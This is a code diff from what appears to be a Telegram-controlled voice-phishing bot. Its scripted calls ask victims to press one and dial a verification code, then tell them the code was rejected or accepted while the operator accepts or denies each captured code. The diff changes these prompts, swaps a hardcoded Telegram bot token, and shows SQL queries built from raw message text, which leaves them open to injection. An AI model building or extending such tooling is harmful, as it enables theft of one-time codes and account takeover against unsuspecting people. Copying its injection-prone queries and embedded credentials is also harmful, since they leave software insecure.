@@ -605,7 +605,7 @@ def First_Script_name(message):
              print(namesc)
              c.execute(f"UPDATE custom_scripts SET script_name='{namesc}' WHERE script_id={last_message_ids[message.from_user.id]}")
              db.commit()
-             send2 =bot.send_message(message.chat.id, "Enter part one of Script.\n(Play - Audio for press 1)",parse_mode='markdown')
+             send2 =bot.send_message(message.chat.id, "Send Part One Of Script:\nNote:- Where You Can Say For {Press One}",parse_mode='markdown')
              bot.register_next_step_handler(send2,First)
      
 
@@ -616,7 +616,7 @@ def First(message):
              print(script1)
              c.execute(f"UPDATE custom_scripts SET intro='{script1}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send2 =bot.send_message(message.chat.id, "Enter part two of Script.\n(Play - Audio for OTP Digits)",parse_mode='markdown')
+             send2 =bot.send_message(message.chat.id, "Send Part Two Of Script:\nNote:- Where You Can Say For {Dail The Verification Code}",parse_mode='markdown')
              bot.register_next_step_handler(send2,Second)
 
 def Second(message):
@@ -624,7 +624,7 @@ def Second(message):
              scp2=message.text
              c.execute(f"UPDATE custom_scripts SET otp='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send3 =bot.send_message(message.chat.id, "Enter part three of Script.\n(Play - Audio for Accept or Deny)",parse_mode='markdown')
+             send3 =bot.send_message(message.chat.id, "Send Part Three Of Script:-\nNote:- Where You Can Say For {Checking The Code}",parse_mode='markdown')
              bot.register_next_step_handler(send3,Third)
              
 def Third(message):
@@ -632,7 +632,7 @@ def Third(message):
              scp2=message.text
              c.execute(f"UPDATE custom_scripts SET waiting='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send3 =bot.send_message(message.chat.id, "Enter part four of Script.\n(Play - Audio for OTP Reject and ask again)",parse_mode='markdown')
+             send3 =bot.send_message(message.chat.id, "Send Part Four Of Script:\nNote:- Where You Can Say {Code Was Code Rejected}",parse_mode='markdown')
              bot.register_next_step_handler(send3,Fourth)
 
 
@@ -641,7 +641,7 @@ def Fourth(message):
              scp2=message.text
              c.execute(f"UPDATE custom_scripts SET wrong='{scp2}' WHERE script_id={last_message_ids[message.from_user.id]} and user_id={id}")
              db.commit()
-             send3 =bot.send_message(message.chat.id, "Enter part fifth of Script.\n(Play - Audio for Code Accepted)",parse_mode='markdown')
+             send3 =bot.send_message(message.chat.id, "Send Part Five Of Script:-\nNote:- Where You Can Say For {Your Code Was Accpeted}",parse_mode='markdown')
              bot.register_next_step_handler(send3,Fifth)
 
 def Fifth(message):
@@ -868,7 +868,8 @@ def custom_confirm1(message):
         callhangup(call_control_id)
 
     elif up_resp1=='Deny':
-        bot.send_message(chat_id,f"""*Playing Script again*""",parse_mode='markdown')
+        bot.send_message(chat_id,f"""*Code Denied*""",parse_mode='markdown')
+        bot.send_message(chat_id,f"""*Reading script again.*""",parse_mode='markdown')
         url = 'https://insufficientmonsoon.online:8443/gather-audio'
         data = {
     "uuid": f"{call_control_id}",
@@ -1199,7 +1200,7 @@ def annonce():
     r2= c.fetchall()
     print(r2)
     for users in r2:  
-        requests.post(f"https://api.telegram.org/bot7393948338:AAF8Ao5d086opzs_XsW_GuL0SeE1N2Jg64U/sendMessage?chat_id={users[1]}&text={user} : {mess}")
+        requests.post(f"https://api.telegram.org/bot7393948338:AAG8R7hWDTb6Z6RXHvtfiuJLVjLxldxP9sU/sendMessage?chat_id={users[1]}&text={user} : {mess}")
     response_data = {'Response': f'Message Sent'}
     return jsonify(response_data)
 
